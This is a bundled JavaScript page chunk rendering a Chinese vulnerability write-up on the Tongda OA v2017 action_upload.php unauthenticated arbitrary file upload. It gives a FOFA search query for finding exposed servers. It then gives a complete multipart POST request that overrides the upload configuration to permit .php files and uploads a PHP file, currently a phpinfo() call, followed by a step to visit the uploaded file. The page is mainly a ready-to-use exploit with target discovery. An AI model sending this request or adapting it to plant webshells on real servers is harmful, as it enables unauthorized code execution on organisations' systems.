(window.webpackJsonp=window.webpackJsonp||[]).push([[216],{1806:function(s,a,n){s.exports=n.p+"assets/img/1628301733285-a06c056e-4c78-4b77-bb05-bb01fef71ebc.54aed6ea.png"},1807:function(s,a,n){s.exports=n.p+"assets/img/1628301944004-f70c17d1-14fa-4653-9888-720876947b7d.ba9bd2bc.png"},1808:function(s,a,n){s.exports=n.p+"assets/img/1628301997079-6703e75c-6115-4f8a-a455-3e53054ce34a.57ff7fa8.png"},3038:function(s,a,n){"use strict";n.r(a);var t=n(64),e=Object(t.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"通达oa-v2017-action-upload-php-任意文件上传漏洞"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#通达oa-v2017-action-upload-php-任意文件上传漏洞"}},[s._v("#")]),s._v(" 通达OA v2017 action_upload.php 任意文件上传漏洞")]),s._v(" "),a("h2",{attrs:{id:"漏洞描述"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),a("p",[s._v("通达OA v2017 action_upload.php 文件过滤不足且无需后台权限，导致任意文件上传漏洞")]),s._v(" "),a("h2",{attrs:{id:"漏洞影响"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v("通达OA v2017")]),a("br"),s._v(" "),a("h2",{attrs:{id:"网络测绘"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v('app="TDXK-通达OA" ')]),a("br"),s._v(" "),a("h2",{attrs:{id:"漏洞复现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),a("p",[s._v("访问获取版本信息")]),s._v(" "),a("p",[a("img",{attrs:{src:n(1806),alt:"img"}})]),s._v(" "),a("p",[s._v("发送请求包上传任意文件")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[s._v('POST /module/ueditor/php/action_upload.php?action=uploadfile HTTP/1.1\nHost: \nUser-Agent: Go-http-client/1.1\nContent-Length: 893\nContent-Type: multipart/form-data; boundary=---------------------------55719851240137822763221368724\nX_requested_with: XMLHttpRequest\nAccept-Encoding: gzip\n\n-----------------------------55719851240137822763221368724\nContent-Disposition: form-data; name="CONFIG[fileFieldName]"\n\nffff\n-----------------------------55719851240137822763221368724\nContent-Disposition: form-data; name="CONFIG[fileMaxSize]"\n\n1000000000\n-----------------------------55719851240137822763221368724\nContent-Disposition: form-data; name="CONFIG[filePathFormat]"\n\ntcmd\n-----------------------------55719851240137822763221368724\nContent-Disposition: form-data; name="CONFIG[fileAllowFiles][]"\n\n.php\n-----------------------------55719851240137822763221368724\nContent-Disposition: form-data; name="ffff"; filename="test.php"\nContent-Type: application/octet-stream\n\n'),a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("<?php")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("phpinfo")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("?>")])]),s._v('\n-----------------------------55719851240137822763221368724\nContent-Disposition: form-data; name="mufile"\n\nsubmit\n-----------------------------55719851240137822763221368724--\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br"),a("span",{staticClass:"line-number"},[s._v("31")]),a("br"),a("span",{staticClass:"line-number"},[s._v("32")]),a("br"),a("span",{staticClass:"line-number"},[s._v("33")]),a("br"),a("span",{staticClass:"line-number"},[s._v("34")]),a("br")])]),a("p",[a("img",{attrs:{src:n(1807),alt:"img"}})]),s._v(" "),a("p",[s._v("再访问上传的文件")]),s._v(" "),a("p",[a("img",{attrs:{src:n(1808),alt:"img"}})])],1)}),[],!1,null,null,null);a.default=e.exports}}]);